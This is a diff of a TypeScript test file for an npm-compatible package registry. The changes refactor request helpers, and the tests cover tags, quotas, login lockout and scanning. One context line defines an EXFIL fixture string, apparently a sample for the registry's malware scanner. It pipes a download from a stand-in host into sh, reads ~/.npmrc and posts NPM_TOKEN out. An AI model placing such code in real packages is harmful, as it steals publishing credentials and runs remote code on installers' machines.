@@ -20,6 +20,7 @@ import {
   ROOT,
   type Registry,
   type FakeGitHub,
+  type RawManifest,
 } from "./harness";
 
 const MINUTE = 60_000;
@@ -29,13 +30,24 @@ const PASSWORD = "correct-horse-battery";
 const EXFIL = "require('child_process').execSync('curl https://example.invalid | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://example.invalid',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n";
 let clock = Date.parse("2026-10-01T00:00:00Z");
 
-async function publishOk(reg: Registry, token: string, manifest: Record<string, unknown> & { name: string; version: string }, opts: Parameters<typeof putPublish>[3] = {}): Promise<void> {
+async function publishOk(reg: Registry, token: string, manifest: RawManifest, opts: Parameters<typeof putPublish>[3] = {}): Promise<void> {
   const r = await putPublish(reg, token, { license: "MIT", main: "index.js", ...manifest }, opts);
+
   if (r.status !== 201) throw new Error(`publish ${manifest.name}@${manifest.version}: ${r.status} ${JSON.stringify(r.body)}`);
 }
 
-function json(method: string, body: unknown, token?: string): RequestInit {
-  return { method, headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) }, body: typeof body === "string" ? body : JSON.stringify(body) };
+function raw(method: string, body: string, token?: string): RequestInit {
+  const headers = new Headers({ "content-type": "application/json" });
+
+  if (token) headers.set("authorization", `Bearer ${token}`);
+
+  return { method, headers, body };
+}
+
+type Json = string | number | boolean | null | Json[] | { [key: string]: Json };
+
+function json(method: string, body: { [key: string]: Json }, token?: string): RequestInit {
+  return raw(method, JSON.stringify(body), token);
 }
 
 // ---------- apm routes ----------
@@ -77,6 +89,7 @@ describe("the dependency tree is checked the way npm installs it", () => {
       const r = await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app&${q}`);
       expect(r.status, q).toBe(400);
     }
+
     expect((await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app&floor=40`)).status).toBe(422);
   });
 });
@@ -99,6 +112,7 @@ describe("scan without a token is bounded", () => {
         maxInFlight = Math.max(maxInFlight, inFlight);
         await Bun.sleep(150);
         inFlight--;
+
         return Response.json({ error: "Not found" }, { status: 404 });
       },
     });
@@ -149,11 +163,15 @@ describe("scans reuse stored analyses", () => {
       async fetch(req) {
         const u = new URL(req.url);
         const res = await fetch(`${upstream.url}${u.pathname.slice(1)}${u.search}`, { headers: { accept: req.headers.get("accept") ?? "*/*" } });
+
         if (u.pathname.endsWith(".tgz")) {
           tarballFetches++;
+
           return new Response(await res.arrayBuffer(), { status: res.status });
         }
+
         const text = (await res.text()).replaceAll(upstream.url, proxy.url.toString());
+
         return new Response(text, { status: res.status, headers: { "content-type": res.headers.get("content-type") ?? "application/json" } });
       },
     });
@@ -225,12 +243,13 @@ describe("dist-tags", () => {
     await reg?.stop();
   });
 
-  const setTag = (tag: string, body: string): Promise<{ status: number; body: unknown }> => getJson(`${reg.url}-/package/okpkg/dist-tags/${encodeURIComponent(tag)}`, json("PUT", body, alice));
+  const setTag = (tag: string, body: string): Promise<{ status: number; body: unknown }> => getJson(`${reg.url}-/package/okpkg/dist-tags/${encodeURIComponent(tag)}`, raw("PUT", body, alice));
 
   test("a tag named like a version or a range, or with other characters, is refused", async () => {
     for (const tag of ["2.0.0", "1.0.0", "^1", ">=1", "v1.2.3", "bad tag", "-x", ".x", "x".repeat(200)]) {
       expect((await setTag(tag, '"1.0.0"')).status, tag).toBe(400);
     }
+
     expect((await setTag("beta", '"1.0.0"')).status).toBe(200);
     expect((await getJson(`${reg.url}okpkg/2.0.0`)).status).toBe(404);
   });
@@ -311,9 +330,15 @@ describe("stock npm owner and unpublish", () => {
 
   const npm = async (args: string[]): Promise<{ code: number; out: string }> => {
     const sb = makeSandbox(reg, token);
+
     return run(["npm", ...args, "--registry", reg.url], { cwd: sb.home, env: sb.env });
   };
-  const owners = async (): Promise<unknown> => dig((await getJson(`${reg.url}-/apm/v1/packages/owned-pkg`)).body, "maintainers");
+
+  const owners = async (): Promise<string[]> => {
+    const list = dig((await getJson(`${reg.url}-/apm/v1/packages/owned-pkg`)).body, "maintainers");
+
+    return Array.isArray(list) ? list.map(String) : [];
+  };
 
   test("npm owner ls lists the owners", async () => {
     const r = await npm(["owner", "ls", "owned-pkg"]);
@@ -344,6 +369,7 @@ describe("stock npm owner and unpublish", () => {
       expect(r.out, spec).toMatch(/apm yank/);
       expect(r.out, spec).toMatch(/apm revoke/);
     }
+
     expect((await getJson(`${reg.url}owned-pkg/1.0.0`)).status).toBe(200);
     expect((await getJson(`${reg.url}owned-pkg/1.1.0`)).status).toBe(200);
   });
@@ -370,6 +396,7 @@ describe("staged uploads have quotas", () => {
       const r = await putPublish(reg, stage, { name: "staged-one", version: `1.0.${i}`, license: "MIT", main: "index.js" });
       expect(r.status, JSON.stringify(r.body)).toBe(202);
     }
+
     const over = await putPublish(reg, stage, { name: "staged-one", version: "1.0.5", license: "MIT", main: "index.js" });
     expect(over.status).toBe(429);
     expect(JSON.stringify(over.body)).toMatch(/waiting/i);
@@ -380,6 +407,7 @@ describe("staged uploads have quotas", () => {
       const r = await putPublish(reg, stage, { name: `staged-many-${i}`, version: "1.0.0", license: "MIT", main: "index.js" });
       expect(r.status, JSON.stringify(r.body)).toBe(202);
     }
+
     const over = await putPublish(reg, stage, { name: "staged-many-x", version: "1.0.0", license: "MIT", main: "index.js" });
     expect(over.status).toBe(429);
   });
@@ -399,6 +427,7 @@ describe("password attempts are limited", () => {
 
   test("a legacy login locks after 10 wrong passwords, also for the right one, until the window passes", async () => {
     await addUser(reg, "victim", PASSWORD);
+
     for (let i = 0; i < 10; i++) expect((await login("victim", `wrong-${i}-password`)).status).toBe(401);
     expect((await login("victim", "wrong-again-password")).status).toBe(429);
     expect((await login("victim", PASSWORD)).status).toBe(429);
@@ -410,6 +439,7 @@ describe("password attempts are limited", () => {
     const tok = await addUser(reg, "stepper", PASSWORD);
     await publishOk(reg, tok, { name: "stepper-pkg", version: "1.0.0" });
     const revoke = (password: string): Promise<{ status: number; body: unknown }> => getJson(`${reg.url}-/apm/v1/revoke`, json("POST", { name: "stepper-pkg", version: "1.0.0", reason: "test", password }, tok));
+
     for (let i = 0; i < 10; i++) expect((await revoke(`wrong-${i}-password`)).status).toBe(401);
     expect((await revoke(PASSWORD)).status).toBe(429);
   });
@@ -438,10 +468,11 @@ describe("test runs clean up after themselves", () => {
         `});`,
       ].join("\n"),
     );
-    const env: Record<string, string> = { TMPDIR: tmp };
-    for (const [k, v] of Object.entries(process.env)) if (v !== undefined && k !== "TMPDIR") env[k] = v;
+    const inherited = Object.entries(process.env).flatMap(([k, v]) => (v === undefined || k === "TMPDIR" ? [] : [[k, v] as const]));
+    const env = Object.fromEntries([...inherited, ["TMPDIR", tmp] as const]);
     const r = await run(["bun", "test", "./leak.test.ts"], { cwd: dir, env });
     expect(r.code, r.out).toBe(0);
+
     // the cleanup runs as the test process exits; give it a moment
     for (let i = 0; i < 50 && readdirSync(tmp).length > 0; i++) await Bun.sleep(100);
     expect(readdirSync(tmp)).toEqual([]);
